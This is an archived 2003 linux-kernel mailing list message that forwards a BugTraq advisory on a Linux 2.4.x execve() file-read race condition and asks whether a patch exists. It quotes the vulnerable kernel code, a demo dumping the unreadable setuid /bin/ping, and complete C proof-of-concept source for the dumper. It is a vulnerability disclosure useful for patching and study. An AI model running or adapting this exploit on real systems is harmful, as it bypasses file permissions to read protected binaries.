Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S263250AbTGASXn (ORCPT <rfc822;willy@w.ods.org>);
	Tue, 1 Jul 2003 14:23:43 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S263271AbTGASXn
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Tue, 1 Jul 2003 14:23:43 -0400
Received: from [65.248.4.67] ([65.248.4.67]:20365 "EHLO verdesmares.com")
	by vger.kernel.org with ESMTP id S263250AbTGASXd (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Tue, 1 Jul 2003 14:23:33 -0400
Message-ID: <000501c33fff$b82a5be0$19dfa7c8@bsb.virtua.com.br>
From: "Breno" <brenosp@brasilsec.com.br>
To: "Kernel List" <linux-kernel@vger.kernel.org>
Subject: [Execve race condition] Patch ??
Date: Tue, 1 Jul 2003 15:36:40 -0300
MIME-Version: 1.0
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
X-XTmail: http://www.verdesmares.com
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

To:  BugTraq 
Subject:  Linux 2.4.x execve() file read race vulnerability 
Date:  Jun 26 2003 5:24PM 
Author:  Paul Starzetz <paul@starzetz.de> 
Message-ID:  <3EFB2C47.3030204@starzetz.de> 
 
 
Hi people,

again it is time to discover a funny bug inside the Linux execve() 
system call.


Details:
---------

While looking at the execve() code I've found the following piece of 
code (from fs/binfmt_elf.c):

static int load_elf_binary(struct linux_binprm * bprm, struct pt_regs * 
regs)
{
    struct file *interpreter = NULL; /* to shut gcc up */

[...]

    retval = kernel_read(bprm->file, elf_ex.e_phoff, (char *) 
elf_phdata, size);
    if (retval < 0)
        goto out_free_ph;

    retval = get_unused_fd();
    if (retval < 0)
        goto out_free_ph;
    get_file(bprm->file);
    fd_install(elf_exec_fileno = retval, bprm->file);


So, during the execution of new binary, the opened file descriptor to 
the executable is put into the file table of the current (the caller of 
execve()) process. This can be exploited creating a file sharing 
parent/child pair by means of the clone() syscall and reading the file 
descriptor from one of them.

Further, the check for shared files structure (in compute_creds() from 
exec.c) is made to late, so even the parent can successfully exit after 
playing games on that file descriptor and the child (if setuid) is 
executed under full privileges. I wrote a simple setuid binary dump 
utility so far, but further implications (due to the complexity of the 
execve() syscall) may be possible...


Lets illustrate the vulnerability:

paul@buggy:~> ls -l /bin/ping
-rws--x--x    1 root     root        29680 Oct 25  2001 /bin/ping

so the setuid ping binary can be only executed by anyone, but not read.

Now we start the suid dumper (while playing with the disk on another 
console like cat /usr/bin/* >/dev/null) :

paul@buggy:~> while true ; do ./suiddmp /bin/ping -c 1 127.0.0.1 ; if 
test $? -eq 1 ; then exit 1 ; fi; done 2>/dev/null | grep -A5 suc

and after few seconds:

Parent success stating:
uid 0 gid 0 mode 104711 inode 9788 size 29680
PING 127.0.0.1 (127.0.0.1) from 127.0.0.1 : 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=94 usec

--- 127.0.0.1 ping statistics ---

paul@buggy:~> ls -l
total 7132
-rwxr-xr-x    1 paul     users       29680 Jun 26 19:17 suid.dump
[...]

paul@buggy:~> ./suid.dump
Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
            [-M mtu discovery hint] [-S sndbuf]
            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination


Obviously the setuid binary has been duplicated :-) (but with no setuid 
flag of course).


Source also available at:

http://www.starzetz.com/paul/suiddmp.c

/ih


 
/****************************************************************
*        *
* Linux 2.4.x suid exec/file read race proof of concept *
* by IhaQueR      *
*        *
****************************************************************/



#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <fcntl.h>
#include <signal.h>

#include <sys/types.h>
#include <sys/stat.h>

#include <asm/page.h>



void fatal(const char *msg)
{
    printf("\n");
    if (!errno) {
 fprintf(stderr, "FATAL: %s\n", msg);
    } else {
 perror(msg);
    }

    printf("\n");
    fflush(stdout);
    fflush(stderr);
    exit(129);
}


int child(char **av)
{
    int fd;

    printf("\nChild running pid %d", getpid());
    fflush(stdout);
    usleep(100000);

    execvp(av[0], av + 1);

    printf("\nFatal child exit\n");
    fflush(stdout);
    exit(0);
}


void exitus(int v)
{
    printf("\nParent terminating (child exited)\n\n");
    fflush(stdout);
    exit(129);
}

void usage(const char *name)
{
    printf("\nSuid exec dumper by IhaQueR\n");
    printf("\nUSAGE:\t%s executable [args...]", name);
    printf("\n\n");
    fflush(stdout);
    exit(0);
}


int main(int ac, char **av)
{
    int p = 0, fd = 0;
    struct stat st, st2;

    if (ac < 2)
 usage(av[0]);

    av[0] = (char *) strdup(av[1]);
    av[1] = (char *) basename(av[1]);

    p = stat(av[0], &st2);
    if (p)
 fatal("stat");

    signal(SIGCHLD, &exitus);
    printf("\nParent running pid %d", getpid());
    fflush(stdout);

    __asm__ (
             "pusha              \n"
             "movl $0x411, %%ebx \n"
             "movl %%esp, %%ecx  \n"
             "movl $120, %%eax   \n"
             "int  $0x80         \n"
             "movl %%eax, %0     \n"
             "popa"
             : : "m"(p)
            );

    if (p < 0)
 fatal("clone");

    if (!p)
 child(av);

    printf("\nParent stat loop");
    fflush(stdout);
    while (1) {
 p = fstat(3, &st);
 if (!p) {
     if (st.st_ino != st2.st_ino)
  fatal("opened wrong file!");

     p = lseek(3, 0, SEEK_SET);
     if (p == (off_t) - 1)
  fatal("lseek");
     fd = open("suid.dump", O_RDWR | O_CREAT | O_TRUNC | O_EXCL,
        0755);
     if (fd < 0)
  fatal("open");
     while (1) {
  char buf[8 * PAGE_SIZE];

  p = read(3, buf, sizeof(buf));
  if (p <= 0)
      break;
  write(fd, buf, p);
     }
     printf("\nParent success stating:");
     fflush(stdout);
     printf("\nuid %d gid %d mode %.5o inode %u size %u",
     st.st_uid, st.st_gid, st.st_mode, st.st_ino,
     st.st_size);
     fflush(stdout);
     printf("\n");
     fflush(stdout);
     exit(1);
 }
    }

    printf("\n\n");
    fflush(stdout);

    return 0;
}

 
There is a patch ?
Breno

